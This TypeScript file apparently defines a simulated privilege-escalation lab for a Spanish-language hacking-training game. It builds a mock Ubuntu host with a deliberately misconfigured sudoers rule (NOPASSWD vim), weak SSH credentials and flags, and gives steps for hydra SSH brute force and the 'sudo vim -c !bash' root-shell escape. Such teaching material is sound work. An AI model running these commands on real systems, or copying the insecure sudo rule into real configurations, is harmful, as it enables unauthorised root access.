import { buildScenario, COMMON_PORTS, createLinuxFileSystem, createFile } from './templates';
import type { Scenario } from '../types';

export const scenario_05: Scenario = buildScenario({
  id: 'scenario-05',
  name: 'Privilege Escalation Lab',
  description: 'Ya tenés acceso SSH como usuario limitado. Escalá privilegios a root explotando una misconfiguration de sudo.',
  difficulty: 'Medium',
  category: 'Network',
  networkRange: '192.168.30.0/24',

  targetMachine: {
    id: 'lab-scenario-05-privesc',
    machine_info: {
      hostname: 'privesc-lab',
      mac: '08:00:27:E8:F9:A1',
      os: 'Ubuntu 20.04 LTS',
      status: 'up',
      type: 'server',
    },
    discovery_level: 0,
    scan_results: { ports: [] },
    learning_steps: [],
    ports: [
      COMMON_PORTS.ssh('OpenSSH 8.2p1 Ubuntu', { user: 'developer', pass: 'dev2024' }),
      COMMON_PORTS.http('Apache httpd 2.4.41'),
    ],
    web_enumeration: {
      web_server: 'Apache/2.4.41',
      cms: 'none',
      directories: [],
    },
    files: [
      ...createLinuxFileSystem({ username: 'developer' }),

      // /etc/sudoers mal configurado — developer puede ejecutar vim como root sin password
      createFile(
        '/etc/sudoers',
        `# /etc/sudoers
# This file MUST be edited with the 'visudo' command as root.
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# User privilege specification
root            ALL=(ALL:ALL) ALL

# Allow developer to run vim as root without password
developer       ALL=(ALL) NOPASSWD: /usr/bin/vim`,
        'text'
      ),

      // Flag de root
      createFile('/root/root.txt', 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}', 'text'),

      // Flag de usuario en home
      createFile('/home/developer/user.txt', 'ZIL{SSH_ACCESS_DEVELOPER}', 'text'),

      // Historia del bash que da una pista
      createFile(
        '/home/developer/.bash_history',
        `ls -la
cat user.txt
sudo -l
id
whoami
sudo vim /etc/hosts`,
        'text'
      ),

      // Nota del sysadmin que da contexto narrativo
      createFile(
        '/home/developer/notes.txt',
        `# Notas del sysadmin
# TODO: Revisar permisos de sudo — developer no debería tener acceso a vim como root
# Fecha: 2024-03-15
# Por ahora dejarlo así hasta el próximo mantenimiento`,
        'text'
      ),

      // /etc/passwd con el usuario developer
      createFile(
        '/etc/passwd',
        `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
developer:x:1001:1001:developer,,,:/home/developer:/bin/bash`,
        'text'
      ),
    ],
  },

  learningSteps: [
    {
      id: 1,
      task: 'Reconocimiento de red',
      text: 'Descubrí el host activo en la red: arp-scan <network/cidr>',
      targetMachineId: 'lab-scenario-05-privesc',
      discoveryLevel: 1,
    },
    {
      id: 2,
      task: 'Escaneo de puertos',
      text: 'Identificá los servicios corriendo: nmap -sV <target-ip>',
      targetMachineId: 'lab-scenario-05-privesc',
      discoveryLevel: 2,
    },
    {
      id: 3,
      task: 'Fuerza bruta SSH',
      text: 'Encontrá las credenciales del usuario developer: hydra -l developer -P rockyou.txt <target-ip> ssh',
      targetMachineId: 'lab-scenario-05-privesc',
      discoveryLevel: 3,
    },
    {
      id: 4,
      task: 'Acceso SSH',
      text: 'Conectate con las credenciales encontradas: ssh developer@<target-ip>',
      targetMachineId: 'lab-scenario-05-privesc',
      discoveryLevel: 3,
    },
    {
      id: 5,
      task: 'Enumeración de sudo',
      text: 'Una vez dentro, listá los permisos de sudo del usuario actual: sudo -l',
      targetMachineId: 'lab-scenario-05-privesc',
      discoveryLevel: 3,
    },
    {
      id: 6,
      task: 'Escalada de privilegios',
      text: 'vim tiene permisos NOPASSWD como root. Usalo para escalar: sudo vim -c \'!bash\'  — Esto abre una shell como root desde dentro de vim.',
      targetMachineId: 'lab-scenario-05-privesc',
      discoveryLevel: 4,
    },
    {
      id: 7,
      task: 'Capturar la flag de root',
      text: 'Ahora sos root. Leé la flag: cat /root/root.txt',
      targetMachineId: 'lab-scenario-05-privesc',
      discoveryLevel: 4,
    },
  ],
});
